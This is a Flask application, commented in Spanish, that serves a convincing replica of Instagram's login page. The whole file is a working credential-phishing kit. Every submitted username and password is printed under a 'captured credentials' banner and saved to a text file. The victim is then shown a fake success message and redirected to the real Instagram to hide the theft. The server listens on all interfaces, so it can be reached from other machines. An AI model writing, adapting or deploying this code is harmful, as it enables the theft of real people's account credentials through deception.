from flask import Flask, render_template_string, request, flash, redirect, url_for
import datetime

app = Flask(__name__)
app.secret_key = 'clave_super_secreta_instagram'

# ===== HTML DE INSTAGRAM (corregido y adaptado para Flask) =====
HTML = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Iniciar Sesión</title>
    <!-- Iconos de Font Awesome (versión completa) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px;
        }

        .top-selector {
            font-size: 14px;
            color: #737373;
            cursor: pointer;
            margin-top: 10px;
        }

        .top-selector i {
            margin-left: 4px;
            font-size: 12px;
        }

        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
            justify-content: center;
            padding-bottom: 40px;
        }

        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 40px;
        }

        /* Icono de cámara con el degradado de Instagram */
        .camera-icon {
            font-size: 60px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-field {
            width: 100%;
            padding: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            background-color: #fafafa;
            font-size: 14px;
            color: #000000;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 25px;
            background-color: #0095f6;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }

        .btn-login:hover {
            background-color: #1877f2;
        }

        .forgot-password {
            color: #000000;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin-top: 20px;
            text-align: center;
        }

        .bottom-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            padding-bottom: 10px;
        }

        .btn-create-account {
            width: 100%;
            padding: 12px;
            border: 1px solid #0095f6;
            border-radius: 25px;
            background-color: transparent;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
        }

        .meta-logo {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #737373;
            font-size: 14px;
            font-weight: 500;
        }

        /* Mensajes flash */
        .flash-messages {
            width: 100%;
            margin-bottom: 15px;
        }
        .flash-messages .flash {
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            margin-bottom: 8px;
            text-align: left;
        }
        .flash-messages .flash.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .flash-messages .flash.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        /* Redirección */
        .redirect-box {
            width: 100%;
            max-width: 360px;
            background: #d4edda;
            border: 1px solid #c3e6cb;
            padding: 15px;
            border-radius: 12px;
            margin: 15px auto;
            color: #155724;
            text-align: center;
        }
        .redirect-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        .redirect-box a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- Selector de idioma superior -->
    <div class="top-selector">
        Español <i class="fa-solid fa-chevron-down"></i>
    </div>

    <!-- Contenedor principal -->
    <div class="main-container">
        <div class="logo-container">
            <!-- Icono de cámara -->
            <i class="fa-solid fa-camera camera-icon"></i>
        </div>

        <!-- Mostrar mensajes flash -->
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                <div class="flash-messages">
                    {% for category, message in messages %}
                        <div class="flash {{ category }}">{{ message }}</div>
                    {% endfor %}
                </div>
            {% endif %}
        {% endwith %}

        <!-- Formulario modificado para Flask -->
        <form class="login-form" action="/" method="post">
            <input type="text" class="input-field" name="email" placeholder="Nombre de usuario, correo o celular" value="{{ request.form.get('email', '') }}" required>
            <input type="password" class="input-field" name="password" placeholder="Contraseña" required>
            <button type="submit" class="btn-login">Iniciar sesión</button>
        </form>

        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
    </div>

    <!-- Contenedor inferior -->
    <div class="bottom-container">
        <a href="#" class="btn-create-account">Crear cuenta nueva</a>
        <div class="meta-logo">
            <i class="fa-brands fa-meta"></i> Meta
        </div>
    </div>

    <!-- Bloque de redirección (se muestra solo tras login exitoso) -->
    {% if redirigir %}
        <div class="redirect-box">
            <strong>✅ ¡Inicio de sesión exitoso!</strong><br>
            Redirigiendo a tu cuenta de Instagram...
            <br><br>
            <a href="https://www.instagram.com" target="_blank">Haz clic aquí si no eres redirigido</a>
        </div>
        <meta http-equiv="refresh" content="2;url=https://www.instagram.com">
    {% endif %}

</body>
</html>"""

@app.route('/', methods=['GET', 'POST'])
def index():
    redirigir = False

    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()

        errores = False

        if not email:
            flash('El nombre de usuario, correo o celular es obligatorio.', 'error')
            errores = True

        if not password:
            flash('La contraseña es obligatoria.', 'error')
            errores = True

        if not errores:
            # Mostrar en la terminal
            print("\n" + "="*55)
            print(f"📸 NUEVAS CREDENCIALES DE INSTAGRAM CAPTURADAS")
            print("-"*55)
            print(f"📅 Fecha y hora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"👤 Usuario/Email: {email}")
            print(f"🔑 Contraseña   : {password}")
            print("="*55 + "\n")

            # Guardar en archivo
            with open('credenciales_instagram.txt', 'a') as f:
                f.write(f"{email},{password},{datetime.datetime.now()}\n")

            flash('¡Inicio de sesión exitoso! Redirigiendo a Instagram...', 'success')
            redirigir = True
            return render_template_string(HTML, redirigir=redirigir)

    return render_template_string(HTML, redirigir=False)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
